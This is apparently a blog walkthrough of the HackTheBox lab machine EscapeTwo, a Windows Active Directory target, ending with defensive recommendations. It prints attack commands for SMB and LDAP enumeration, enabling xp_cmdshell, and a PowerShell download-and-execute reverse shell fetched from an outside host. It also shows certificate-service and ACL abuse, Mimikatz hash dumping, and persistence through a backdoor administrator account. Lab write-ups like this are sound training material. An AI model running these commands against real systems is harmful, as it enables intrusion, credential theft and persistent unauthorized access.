---
layout: post
title: "EscapeTwo HackTheBox Walkthrough"
date: 2026-02-24
categories: [HackTheBox]
tags: [hackthebox, windows, active-directory, smb, ldap, kerberos, mssql, adcs, privilege-escalation]
---

# EscapeTwo - HackTheBox Walkthrough

[EscapeTwo - HackTheBox Room](https://www.hackthebox.com/machines/escapetwo){:target="_blank"}

## Overview

**Difficulty:** Easy
**Platform:** Hack The Box
**Focus:** SMB, LDAP, Kerberos, MSSQL, AD CS, Privilege Escalation 

`EscapeTwo` is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to `MSSQL`, granting us initial access. System enumeration reveals `SQL` credentials, which are sprayed to obtain `WinRM` access. Further domain analysis shows the user has write owner rights over an account managing `ADCS`. This is used to enumerate `ADCS`, revealing a misconfiguration in `Active Directory Certificate Services`. Exploiting this misconfiguration allows us to retrieve the `Administrator` account hash, ultimately leading to complete domain compromise.

This walkthrough covers the compromise of the Hack The Box machine EscapeTwo, a Windows Active Directory target vulnerable to exposed SMB shares, credential reuse, MSSQL command execution, and abuse of misconfigured Active Directory Certificate Services (ESC4), resulting in SYSTEM-level access.

## Initial Enumeration

### Nmap Scan

```bash
nmap -sV -sC -Pn -p- -oN escapetwo_scan 10.10.11.51
```

### Open Ports Identified

- **53/tcp** - DNS (Simple DNS Plus)  
- **88/tcp** - Kerberos (Windows Kerberos)  
- **135/tcp** - Microsoft Windows RPC  
- **139/tcp** - NetBIOS-SSN  
- **389/tcp** - LDAP (Active Directory)  
- **445/tcp** - SMB (Microsoft Windows SMB)  
- **1433/tcp** - MS-SQL (Microsoft SQL Server 2019)  
- **5985/tcp** - WinRM (Windows Remote Management)  
- **47001/tcp** - HTTP (Microsoft HTTPAPI httpd 2.0)  

## Initial Foothold

### SMB Enumeration
```bash
smbclient -L //10.10.11.51/ -U Rose
```

- Discovered files in "Accounting Department":

  - `accounting_2024.xlsx`
  - `accounts.xlsx`
- Extracted XML data (`sharedStrings.xml`) revealing usernames and plaintext passwords.

### LDAP Enumeration

```bash
ldapdomaindump -u 'sequel.htb\Rose' -p 'password123' 10.10.11.51
```

### SQL Server (MSSQL) Access

```bash
sqsh -S 10.10.11.51 -U sa -P 'password123'
sqsh -S 10.10.11.51 -U sql_svc -P 'WqSZAFxxxxxxxxxx'
```

### Enabling xp_cmdshell for Command Execution

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Obtaining a Reverse Shell Using xp_cmdshell

```sql
xp_cmdshell 'powershell -nop -c IEX (New-Object Net.WebClient).DownloadString("http://10.10.16.8/shell.ps1")';
```

## Privilege Escalation

### Certipy (ESC4 Vulnerability)

```bash
certipy request -username ca_svc -password 'password' -dc-ip 10.10.11.51
certipy auth -username ca_svc -password 'password' -target 10.10.11.51
```

### Active Directory Manipulation (PowerView)

```powershell
Add-DomainObjectAcl -TargetIdentity ca_svc -PrincipalIdentity Ryan -Rights ResetPassword
Set-DomainUserPassword -Identity ca_svc -AccountPassword $pass
```

## Post-Exploitation

### Dumping Hashes with Mimikatz

```bash
mimikatz.exe "privilege::debug" "log" "lsadump::sam" exit
```

### Persistence Techniques

```bash
net user pentester P@ssw0rd /add
net localgroup administrators pentester /add
winrm set winrm/config/service/auth @{Basic="true"}
```

## Key Takeaways

- **SMB Misconfigurations:** Exposed user credentials.  
- **Weak Password Policy:** Allowed credential reuse.  
- **AD CS Misconfiguration (ESC4):** Enabled privilege escalation.  

## Recommendations

- Restrict SMB share access and enforce strong passwords.  
- Secure MSSQL by disabling `xp_cmdshell` and using MFA.  
- Review and secure AD Certificate Services (AD CS) permissions.  
